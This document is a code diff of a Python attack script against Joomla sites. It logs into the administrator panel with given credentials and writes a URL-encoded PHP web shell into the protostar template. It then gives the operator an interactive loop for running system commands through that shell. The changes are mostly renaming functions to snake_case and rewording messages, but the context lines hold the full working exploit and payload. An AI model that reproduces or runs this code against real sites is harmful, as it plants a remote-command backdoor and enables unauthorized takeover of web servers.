@@ -1,13 +1,15 @@
+import sys
 import requests
 import argparse
 from bs4 import BeautifulSoup
+
 
 # WORDPRESS
 
 # JOOMLA
 
 # GET HIDDEN VALUES FROM /index.php IN JOOMLA
-def getHiddenValues(url):
+def get_hidden_values(url):
     try:
         response = requests.get(f"{url}/administrator/index.php")
     except requests.exceptions.MissingSchema:
@@ -41,7 +43,7 @@ def getHiddenValues(url):
         return {}    
 
 # LOGIN JOOMLA
-def postLoginJoomla(user, password, url, hidden_values):
+def post_login_joomla(user, password, url, hidden_values):
     
     data = {
         'username': user,
@@ -54,19 +56,20 @@ def postLoginJoomla(user, password, url, hidden_values):
     }
     
     host = (f"{url}/administrator/index.php")
-    
+
     response = requests.post(host, data, allow_redirects=True)
+
     print(response.request)
     # Debug
     print("[+] Start login into admin")
     print(f'[+] {data}')
     print(f'[+] Status code: {response.status_code}')
     # Lunch
-    putExploitJoomla(url)
+    put_exploit_joomla(url)
     
 # EXPLOIT JOOMLA
 ## exploit on the protostar theme, needs to make it for the active one etc..
-def putExploitJoomla(url):
+def put_exploit_joomla(url):
     data = {
         'jform%5Bsource%5D': '%3C%3Fphp%0D%0Asystem%28%24_GET%5B%27cmd%27%5D%29%3B%0D%0A%3F%3E',
         'task': 'template.apply',
@@ -89,7 +92,7 @@ def putExploitJoomla(url):
     if "HelloWorld" in response.content.decode('utf-8'):
         print("[+] Open input user, let's start hacking")
         while True:
-            user_cmd = input("Enter a shell command (type 'exit' to quit): ")
+            user_cmd = input("Enter a (web)shell command (type 'exit' to quit): ")
         
             if user_cmd.lower() == 'exit':
                 break
@@ -99,7 +102,7 @@ def putExploitJoomla(url):
         
             print(response.content.decode('utf-8'))
     else:
-        print("[+] Can't open a webshell")
+        print("[!] Can't open a webshell")
 
         
 
@@ -121,10 +124,11 @@ def main():
             print('[+] Mode: wordpress')
         elif args.mode == 'joomla':
             print('[+] Mode: joomla')
-            hidden_values = getHiddenValues(args.url)
-            postLoginJoomla(args.username, args.password, args.url, hidden_values)
+            hidden_values = get_hidden_values(args.url)
+            post_login_joomla(args.username, args.password, args.url, hidden_values)
     else:
         print("No CMS mode specified. Please choose a CMS mode: wordpress or joomla.")
+
 
 if __name__ == "__main__":
     main()
